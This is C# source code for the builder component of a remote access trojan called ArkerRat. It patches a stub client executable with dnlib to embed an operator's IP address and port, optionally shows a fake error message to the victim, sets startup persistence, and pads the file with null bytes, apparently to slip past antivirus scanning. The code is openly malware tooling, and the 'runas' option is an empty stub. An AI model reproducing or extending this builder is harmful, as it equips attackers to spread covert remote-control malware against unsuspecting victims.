using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.CodeDom.Compiler;
using System.IO;
using System.Diagnostics;
using System.Windows;
using System.Security.Cryptography;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace ArkerRatWpfVersion
{
    public class Builder
    {

        public string _path { get; set; }
        public Builder(string ip, string port, string fileName, bool autoStart, bool cryptor, string fileManip,bool fileManipOnOff, string messageTitle, string message, bool messageOn, bool runas) 
        {
            _path = Path.Combine(Directory.GetCurrentDirectory(), "client") + "\\" + fileName + ".exe";
            BuildClient(ip, port, fileName, autoStart,cryptor,fileManip,fileManipOnOff,messageTitle,message,messageOn, runas);
        }

        private void BuildClient(string ip, string port, string fileName, bool autoStart, bool cryptor, string fileManip, bool fileManipOnOff, string messageTitle, string message, bool messageOn, bool runas)
        {
            using (var module = ModuleDefMD.Load(Path.Combine(Directory.GetCurrentDirectory() + "\\temp", "temp.exe")))
            {
                //IP, PORT
                var targetType = module.GetTypes().First(type=>type.Name== "RATClientSession");
                var _ip = targetType.FindField("ip");
                var _port = targetType.FindField("port");
                var cctr = targetType.FindStaticConstructor();
                for (int i = 0; i < cctr.Body.Instructions.Count; i++)
                {
                    var instruction = cctr.Body.Instructions[i];
                    if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand==_ip)
                    {
                        cctr.Body.Instructions[i-1]=OpCodes.Ldstr.ToInstruction(ip);
                    }
                    else if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == _port)
                    {
                        cctr.Body.Instructions[i - 1] = OpCodes.Ldc_I4.ToInstruction(Convert.ToInt32(port));
                    }
                }

                //Error msg
                if (messageOn)
                {
                    targetType = module.GetTypes().First(type => type.Name == "Program");
                    var _title = targetType.FindField("title");
                    var _message = targetType.FindField("message");
                    cctr = targetType.FindStaticConstructor();
                    for (int i = 0; i < cctr.Body.Instructions.Count; i++)
                    {
                        var instruction = cctr.Body.Instructions[i];
                        if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == _title)
                        {
                            cctr.Body.Instructions[i - 1] = OpCodes.Ldstr.ToInstruction(messageTitle);
                        }
                        else if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == _message)
                        {
                            cctr.Body.Instructions[i - 1] = OpCodes.Ldstr.ToInstruction(message);
                        }
                    }
                }

                //CopyToStartUp
                if (autoStart)
                {
                    targetType = module.GetTypes().First(type => type.Name == "Program");
                    var _autoStart = targetType.FindField("autoStart");
                    cctr = targetType.FindStaticConstructor();
                    for (int i = 0; i < cctr.Body.Instructions.Count; i++)
                    {
                        var instruction = cctr.Body.Instructions[i];
                        if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == _autoStart)
                        {
                            cctr.Body.Instructions[i - 1] = OpCodes.Ldc_I4.ToInstruction(1);
                        }                      
                    }
                }
               
                module.Write(_path);
            }

            if (fileManipOnOff)
            {
                try
                {
                    int size = Convert.ToInt32(fileManip);
                    FilePump(size);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Incorrect pump-size, skiped file manipulation step.");
                }
            }

            if (runas)
            {
                

            }
        }

        private void FilePump(int size)
        {
            using(FileStream fs = new FileStream(_path, FileMode.Append))
            {
                byte[] pump = new byte[size*1000];
                fs.Write(pump, 0, pump.Length);
            }
        }
    }
}
